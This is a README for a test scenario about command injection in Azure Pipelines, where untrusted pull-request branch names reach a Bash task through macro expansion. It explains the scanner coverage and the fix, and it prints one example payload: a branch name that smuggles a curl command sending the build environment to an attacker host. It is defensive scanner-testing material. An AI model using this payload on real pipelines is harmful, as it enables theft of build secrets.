# Scenario 49: Azure — macro `$(...)` injection into a script task

**Provider:** Azure Pipelines · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`azure-pipelines.yml`](azure-pipelines.yml)

## The pattern

A macro variable `$(...)` that resolves at **runtime** from untrusted input is
spliced into a `Bash@3`/`script` task:

```yaml
- task: Bash@3
  inputs:
    script: echo "Building branch $(System.PullRequest.SourceBranch)"
```

Macro expansion is plain substring substitution into the generated script with
**no filtering** (Microsoft's `VarUtil.ExpandValues()`), so an attacker who
controls the value controls shell syntax. The PR source-branch name is
attacker-controlled; queue-time variables are too when "Limit variables set at
queue time" is off.

## How an attacker exploits it

A PR source branch named `x"; curl https://attacker.tld/$(env|base64) #` turns
the line into that curl, run on the agent with the build's secrets. Pulse
Security demonstrated this with low-privilege "run pipeline" users.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `ADO-002` — script injection via attacker-controllable context |
| Checkov | — |

> pipeline-check 1.9.0 added `ADO-002`, which flags the macro `$(...)` splice into the Bash task as attacker-controllable script injection.

## Fix

Map the untrusted value into the task's `env:` and reference it as a quoted
shell variable (`$BRANCH`), never inline `$(...)`. Mark scripted variables
`readonly: true` and enable "Limit variables that can be set at queue time".

## References

- Microsoft Learn — Securely use variables and parameters: https://learn.microsoft.com/azure/devops/pipelines/security/inputs
- Pulse Security — Azure DevOps command injection: https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection
